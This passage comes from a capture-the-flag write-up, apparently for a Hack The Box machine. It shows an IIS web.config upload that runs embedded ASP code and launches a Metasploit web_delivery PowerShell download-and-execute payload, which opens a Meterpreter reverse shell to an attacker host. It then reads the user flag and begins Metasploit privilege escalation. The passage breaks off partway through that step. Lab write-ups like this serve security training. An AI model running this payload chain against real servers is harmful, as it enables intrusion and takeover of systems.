               &lt;span class=&quot;nt&quot;&gt;&amp;lt;remove&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;fileExtension=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.config&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;/fileExtensions&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;hiddenSegments&amp;gt;&lt;/span&gt;
               &lt;span class=&quot;nt&quot;&gt;&amp;lt;remove&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;segment=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;web.config&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;/hiddenSegments&amp;gt;&lt;/span&gt;
         &lt;span class=&quot;nt&quot;&gt;&amp;lt;/requestFiltering&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/security&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/system.webServer&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%
Response.write(&quot;-&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;-&amp;gt;&quot;)
Response.write(1+2)
Response.write(&quot;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!-&quot;&amp;amp;&quot;-&quot;)
%&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The ASP code is located at the very bottom of the file, between &lt;strong&gt;&amp;lt;%&lt;/strong&gt; and &lt;strong&gt;%&amp;gt;&lt;/strong&gt;. With this payload, the server should return “3” if it is vulnerable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-28/uploaded.png&quot; alt=&quot;File uploaded&quot; title=&quot;File uploaded&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Our file uploaded successfully so it means this file extension is allowed. We will suppose that files are not renamed during the upload so we will try to access it at &lt;strong&gt;/uploadedfiles/web.config&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-28/vulnerable.png&quot; alt=&quot;RCE vulnerability test&quot; title=&quot;RCE vulnerability test&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It works! :fireworks: Now we should be able to execute commands on the web server.&lt;/p&gt;

&lt;h3 id=&quot;meterpreter-shell&quot;&gt;Meterpreter Shell&lt;/h3&gt;

&lt;p&gt;A reverse shell is generally what we are looking for when it comes to RCE. This time we will do better!&lt;/p&gt;

&lt;p&gt;Metasploit can generate specific payloads but also setup a listener that will wait for the return of our reverse shell.
But why would we do that? Because it offers the possibility to execute metasploit exploit modules directly inside our remote session.
We can also juggle between several sessions, which can be pretty useful in some cases.&lt;/p&gt;

&lt;p&gt;Here is the list of steps we will follow:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Generate our &lt;strong&gt;meterpreter shell payload&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Incorporate the payload into the &lt;strong&gt;web.config&lt;/strong&gt; file.&lt;/li&gt;
  &lt;li&gt;Upload the web.config file.&lt;/li&gt;
  &lt;li&gt;Access the uploaded file in order to trigger the payload.&lt;/li&gt;
  &lt;li&gt;See what happens…&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;meterpreter-shell-payload&quot;&gt;Meterpreter Shell Payload&lt;/h4&gt;

&lt;p&gt;First, we have to run Metasploit console with &lt;code class=&quot;highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt;. Then, we will use the &lt;strong&gt;web delivery script&lt;/strong&gt; exploit module. A module is loaded with the keyword &lt;em&gt;“use”&lt;/em&gt;, followed by the path of the module.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/multi/script/web_delivery
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, you can type &lt;em&gt;“options”&lt;/em&gt; to list all available parameters for this module:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; options

Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;exploit/multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name     Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   SRVHOST  0.0.0.0          yes       The &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;host to listen on. This must be an address on the &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;machine or 0.0.0.0
   SRVPORT  8080             yes       The &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;port to listen on.
   SSL      &lt;span class=&quot;nb&quot;&gt;false            &lt;/span&gt;no        Negotiate SSL &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;incoming connections
   SSLCert                   no        Path to a custom SSL certificate &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default is randomly generated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   URIPATH                   no        The URI to use &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;this exploit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default is random&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;


Payload options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;python/meterpreter/reverse_tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name   Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   LHOST                   yes       The listen address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;an interface may be specified&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
   0   Python

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We will now specify several parameters in order to adapt the payload to our environment.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;SRVHOST 10.10.13.75  &lt;span class=&quot;c&quot;&gt;# Ip address of our machine&lt;/span&gt;
SRVHOST &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 10.10.13.75
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;TARGET 2  &lt;span class=&quot;c&quot;&gt;# TARGET 2 = powershell payload&lt;/span&gt;
TARGET &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 2
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;PAYLOAD windows/x64/meterpreter/reverse_tcp  &lt;span class=&quot;c&quot;&gt;# The payload we want to inject, a reverse shell&lt;/span&gt;
PAYLOAD &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; windows/x64/meterpreter/reverse_tcp
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LHOST 10.10.13.75  &lt;span class=&quot;c&quot;&gt;# IP address for the reverse shell&lt;/span&gt;
LHOST &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 10.10.13.75
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Exploit running as background job 0.
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.13.75:4444
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Using URL: http://10.10.13.75:8080/moceswFJvKmkeD8
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Server started.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Run the following &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;on the target machine:
powershell.exe &lt;span class=&quot;nt&quot;&gt;-nop&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; hidden &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;new-object net.webclient&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$g&lt;/span&gt;.proxy&lt;span class=&quot;o&quot;&gt;=[&lt;/span&gt;Net.WebRequest]::GetSystemWebProxy&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$g&lt;/span&gt;.Proxy.Credentials&lt;span class=&quot;o&quot;&gt;=[&lt;/span&gt;Net.CredentialCache]::DefaultCredentials&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;IEX &lt;span class=&quot;nv&quot;&gt;$g&lt;/span&gt;.downloadstring&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'http://10.10.13.75:8080/moceswFJvKmkeD8'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Here is our payload! We must now integrate it into the &lt;strong&gt;web.config&lt;/strong&gt; file. Do not close the msfconsole or hit CTR+C because Metasploit is currently listening and waiting for the payload to return.&lt;/p&gt;

&lt;h4 id=&quot;payload-incorporation&quot;&gt;Payload Incorporation&lt;/h4&gt;

&lt;p&gt;As you may have noticed, the payload is a &lt;strong&gt;powershell script&lt;/strong&gt; (remember &lt;em&gt;set TARGET 2&lt;/em&gt;) and not an &lt;strong&gt;ASP&lt;/strong&gt; script.
However, we can call system functions in &lt;strong&gt;ASP&lt;/strong&gt; so we will call &lt;strong&gt;cmd.exe&lt;/strong&gt; and pass our payload as an argument.&lt;/p&gt;

&lt;p&gt;This will result in the following &lt;strong&gt;web.config&lt;/strong&gt; file:&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;system.webServer&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;handlers&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;accessPolicy=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Read, Script, Write&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;add&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;web_config&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;path=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*.config&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;verb=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;modules=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;IsapiModule&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;scriptProcessor=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%windir%\system32\inetsrv\asp.dll&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;resourceType=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unspecified&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;requireAccess=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Write&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;preCondition=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bitness64&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/handlers&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;security&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;requestFiltering&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;fileExtensions&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;remove&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;fileExtension=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.config&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/fileExtensions&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;hiddenSegments&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;remove&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;segment=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;web.config&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/hiddenSegments&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/requestFiltering&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/security&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/system.webServer&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%
on error resume next
Dim oS,output
Set oS = Server.CreateObject(&quot;WSCRIPT.SHELL&quot;)
output = oS.exec(&quot;cmd.exe &amp;gt; /c powershell.exe -nop -w hidden -c $B=new-object net.webclient;$B.proxy=[Net.WebRequest]::GetSystemWebProxy();$B.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $B.downloadstring('http://10.10.13.75:8080/G783OPiDR3Em');&quot;).stdout.readall
Response.write(&quot;Powershell: &quot; &lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt; vbCrLf &lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt; output &lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt; vbCrLf &lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt; vbCrLf)
%&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;upload-webconfig-and-access-it&quot;&gt;Upload web.config and access it&lt;/h4&gt;

&lt;p&gt;Now we have to upload our &lt;strong&gt;web.config&lt;/strong&gt; file and visit the URL &lt;a href=&quot;http://10.10.10.93/uploadedfiles/web.config&quot;&gt;http://10.10.10.93/uploadedfiles/web.config&lt;/a&gt; to trigger the payload.&lt;/p&gt;

&lt;h4 id=&quot;back-to-msfconsole&quot;&gt;Back to msfconsole&lt;/h4&gt;

&lt;p&gt;We should see the following inside &lt;strong&gt;msfconsole&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 10.10.10.93      web_delivery - Delivering Payload
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Sending stage &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;206403 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to 10.10.10.93
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Meterpreter session 1 opened &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.13.75:4444 -&amp;gt; 10.10.10.93:49158&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2018-10-28 19:23:06 +0100
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A session has been opened on the remote target. We can list every opened sessions with &lt;code class=&quot;highlighter-rouge&quot;&gt;sessions -l&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; sessions &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;

Active sessions
&lt;span class=&quot;o&quot;&gt;===============&lt;/span&gt;

  Id  Name  Type                     Information             Connection
  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                     &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;             &lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt;
  1         meterpreter x64/windows  BOUNTY&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;erlin @ BOUNTY  10.10.13.75:4444 -&amp;gt; 10.10.10.93:49158 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.93&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, we are currently connected as &lt;strong&gt;merlin&lt;/strong&gt; on the &lt;strong&gt;BOUNTY&lt;/strong&gt; machine.&lt;/p&gt;

&lt;h4 id=&quot;gimme-this-usertxt&quot;&gt;Gimme this user.txt&lt;/h4&gt;

&lt;p&gt;It’s now time to retrieve the &lt;strong&gt;user flag&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Inside &lt;strong&gt;msfconsole&lt;/strong&gt;, we can move into the session number 1 with &lt;code class=&quot;highlighter-rouge&quot;&gt;sessions -i 1&lt;/code&gt; and we should arrive in a meterpreter shell.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; sessions &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Starting interaction with 1...

meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From here, we can use a few shell commands (the full list can be displayed by typing &lt;code class=&quot;highlighter-rouge&quot;&gt;help&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;?&lt;/code&gt;) or type &lt;code class=&quot;highlighter-rouge&quot;&gt;shell&lt;/code&gt; and dive into the classical Windows command prompt.&lt;/p&gt;

&lt;p&gt;I suggest you to play around with the available commands from &lt;strong&gt;meterpreter&lt;/strong&gt; and to get familiar with it.&lt;/p&gt;

&lt;p&gt;The following command will give you the user flag:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;C:/Users/merlin/Desktop/user.txt
e29ad8[...]2f44a2f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;

&lt;p&gt;The privilege escalation was very straight-forward for this box, especially with meterpreter.&lt;/p&gt;

&lt;p&gt;We will use a great module for lazy people, which is called: &lt;strong&gt;local_exploit_suggester&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;local-exploit-suggester&quot;&gt;Local Exploit Suggester&lt;/h3&gt;

&lt;p&gt;Back in our metepreter session, we can call this module with the following command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run post/multi/recon/local_exploit_suggester

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 10.10.10.93 - Collecting &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;exploits &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;x64/windows...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 10.10.10.93 - 10 exploit checks are being tried...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 10.10.10.93 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 10.10.10.93 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 10.10.10.93 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So many options! :smiling_imp:&lt;/p&gt;

&lt;p&gt;Let’s try the first one…&lt;/p&gt;

&lt;h3 id=&quot;ms10_092_schelevator&quot;&gt;ms10_092_schelevator&lt;/h3&gt;

&lt;p&gt;We can background our current &lt;strong&gt;meterpreter session&lt;/strong&gt; thanks to the command &lt;code class=&quot;highlighter-rouge&quot;&gt;background&lt;/code&gt; so we go back to &lt;strong&gt;msfconsole&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Then, we can tell Metasploit to use &lt;strong&gt;exploit/windows/local/ms10_092_schelevator&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/windows/local/ms10_092_schelevator
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; options

Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;exploit/windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name      Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   CMD                        no        Command to execute instead of a payload
   SESSION                    yes       The session to run this module on.
   TASKNAME                   no        A name &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the created task &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default random&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;


Exploit target:

   Id  Name
   &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
   0   Windows Vista, 7, and 2008
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We specify the &lt;strong&gt;session number&lt;/strong&gt; to run this module on and the payload we want along with the local port to listen on for the reverse shell.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;We can’t use the same port as our previous reverse shell or no session will be created.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;SESSION 1   &lt;span class=&quot;c&quot;&gt;# The session number of our reverse shell (sessions -l to display them)&lt;/span&gt;
SESSION &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 1
